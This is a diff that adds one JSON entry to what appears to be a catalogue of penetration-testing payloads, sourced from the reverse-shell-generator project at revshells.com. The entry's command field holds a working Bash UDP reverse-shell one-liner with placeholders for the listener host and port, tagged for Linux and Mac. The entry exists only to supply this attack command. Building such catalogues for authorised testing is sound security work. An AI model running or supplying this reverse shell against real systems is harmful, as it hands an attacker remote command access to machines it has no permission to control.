@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-bash-udp",
+  "name": "RSG · ReverseShell · Bash udp",
+  "command": "<shell> -i >& /dev/udp/<lhost>/<lport> 0>&1",
+  "description": "Reverse Shell payload — Bash udp (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/Bash udp/4",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
